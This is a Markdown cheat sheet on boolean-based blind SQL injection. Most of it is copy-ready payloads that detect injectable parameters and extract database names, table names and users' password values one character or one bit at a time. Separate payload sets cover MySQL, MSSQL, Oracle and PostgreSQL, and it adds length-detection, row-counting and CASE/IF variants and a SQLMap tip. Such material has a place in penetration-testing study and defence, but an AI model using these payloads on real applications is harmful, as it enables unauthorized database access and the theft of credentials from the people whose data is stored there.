# Boolean-based Blind SQL Injection

## Overview

Boolean blind SQLi infers data by observing different application responses for true/false conditions. Used when:
- No error messages displayed
- No direct data output
- Response differs based on query result (content length, status code, page content)

## Detection

### True vs False Response

```sql
' AND 1=1--    -- True: normal response
' AND 1=2--    -- False: different/empty response
```

```sql
' OR 1=1--     -- Always true
' OR 1=2--     -- Depends on original condition
```

### Confirming Boolean Behavior

```sql
' AND 'a'='a'--     -- True
' AND 'a'='b'--     -- False
```

## Data Extraction Technique

### Character-by-Character Extraction

Using SUBSTRING to test each character:

```sql
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='b'--
...
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),2,1)='a'--
```

### Binary Search Optimization

Instead of testing each character (26+ possibilities), use binary search:

```sql
' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>109--  -- m
' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>96--   -- Narrowing down
' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=115--  -- s (found!)
```

## DBMS-Specific Payloads

### MySQL

```sql
-- Check if version starts with 5
' AND SUBSTRING(@@version,1,1)='5'--

-- Extract database name character by character
' AND ASCII(SUBSTRING(database(),1,1))>96--
' AND ASCII(SUBSTRING(database(),1,1))=100--  -- 'd'

-- Extract table name
' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1))>96--

-- Extract data
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1))>96--
```

Alternative functions:
```sql
' AND MID(database(),1,1)='a'--
' AND LEFT(database(),1)='a'--
' AND SUBSTR(database(),1,1)='a'--
```

### MSSQL

```sql
-- Check version
' AND SUBSTRING(@@version,1,1)='M'--

-- Extract database name
' AND ASCII(SUBSTRING(DB_NAME(),1,1))>96--

-- Extract table name
' AND ASCII(SUBSTRING((SELECT TOP 1 table_name FROM information_schema.tables),1,1))>96--

-- Extract data
' AND ASCII(SUBSTRING((SELECT TOP 1 password FROM users),1,1))>96--
```

### Oracle

```sql
-- Check version
' AND SUBSTR((SELECT banner FROM v$version WHERE ROWNUM=1),1,1)='O'--

-- Extract user
' AND ASCII(SUBSTR((SELECT user FROM dual),1,1))>96--

-- Extract table name
' AND ASCII(SUBSTR((SELECT table_name FROM all_tables WHERE ROWNUM=1),1,1))>96--

-- Extract data (with proper pagination)
' AND ASCII(SUBSTR((SELECT password FROM users WHERE ROWNUM=1),1,1))>96--
```

### PostgreSQL

```sql
-- Check version
' AND SUBSTRING(version(),1,1)='P'--

-- Extract database
' AND ASCII(SUBSTRING(current_database(),1,1))>96--

-- Extract table name
' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1),1,1))>96--

-- Extract data
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>96--
```

## Length Detection

Before extracting, find string length:

### MySQL
```sql
' AND LENGTH(database())=5--
' AND LENGTH((SELECT password FROM users LIMIT 0,1))=32--
```

### MSSQL
```sql
' AND LEN(DB_NAME())=5--
' AND LEN((SELECT TOP 1 password FROM users))=32--
```

### Oracle
```sql
' AND LENGTH((SELECT user FROM dual))=5--
' AND LENGTH((SELECT password FROM users WHERE ROWNUM=1))=32--
```

### PostgreSQL
```sql
' AND LENGTH(current_database())=5--
' AND LENGTH((SELECT password FROM users LIMIT 1))=32--
```

## Counting Records

```sql
-- MySQL
' AND (SELECT COUNT(*) FROM users)=5--

-- MSSQL
' AND (SELECT COUNT(*) FROM users)=5--

-- Oracle
' AND (SELECT COUNT(*) FROM users)=5--

-- PostgreSQL
' AND (SELECT COUNT(*) FROM users)=5--
```

## Conditional Extraction Payloads

### Using CASE

```sql
' AND (CASE WHEN (1=1) THEN 1 ELSE 0 END)=1--
' AND (CASE WHEN (SUBSTRING(database(),1,1)='a') THEN 1 ELSE 0 END)=1--
```

### Using IF (MySQL)

```sql
' AND IF(1=1,1,0)=1--
' AND IF(SUBSTRING(database(),1,1)='a',1,0)=1--
```

## Advanced Techniques

### Extracting Multiple Rows

Use LIMIT/OFFSET to iterate:

```sql
-- MySQL: Get 1st row
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1))>96--

-- MySQL: Get 2nd row
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1,1),1,1))>96--
```

### Bitwise Extraction

Extract binary representation for faster enumeration:

```sql
' AND (ASCII(SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1)) & 128)=128--  -- bit 7
' AND (ASCII(SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1)) & 64)=64--    -- bit 6
...
' AND (ASCII(SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1)) & 1)=1--      -- bit 0
```

## Response Indicators

| Indicator | True | False |
|-----------|------|-------|
| HTTP Status | 200 | 500/404 |
| Content Length | Normal | Different |
| Page Content | "Welcome" present | "Welcome" missing |
| Element Count | Normal | Fewer elements |

## Tips

- Start with binary search (faster than sequential)
- Always determine string length first
- Use LIMIT/OFFSET for row iteration
- Monitor response time (might indicate time-based works too)
- Automate with scripts or SQLMap `-technique=B`
